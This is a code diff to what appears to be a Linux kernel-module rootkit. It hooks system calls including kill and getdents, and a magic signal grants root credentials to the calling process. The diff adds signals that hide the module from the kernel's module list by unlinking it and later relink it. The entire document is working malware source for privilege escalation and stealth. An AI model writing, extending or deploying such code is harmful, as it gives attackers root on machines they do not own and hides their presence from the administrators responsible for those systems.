@@ -24,6 +24,8 @@
 #define SYS_CALL_NUM 300
 
 #define SIG_GIVE_ROOT 32
+#define SIG_HIDE 33
+#define SIG_UNHIDE 34
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
@@ -34,6 +36,8 @@ asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
+
+struct list_head *module_list;
 
 
 void update_sys_calls(void **sys_call_table){
@@ -94,6 +98,14 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
         case SIG_GIVE_ROOT:
             give_root();
             pr_info("Root priviledge given!\n");
+            break;
+        case SIG_HIDE:
+            pr_info("Hiding the module!\n");
+            hide();
+            break;
+        case SIG_UNHIDE:
+            pr_info("Unhiding the module!\n");
+            unhide();
             break;
         default:
             return original_kill(pid, sig);
@@ -201,6 +213,17 @@ void give_root(void)
     newcreds->fsuid = newcreds->fsgid = 0;
  
     commit_creds(newcreds);
+}
+
+void hide(void)
+{
+    module_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide(void)
+{
+    list_add(&THIS_MODULE->list, module_list);
 }
 
 void **find_syscall_table(void)
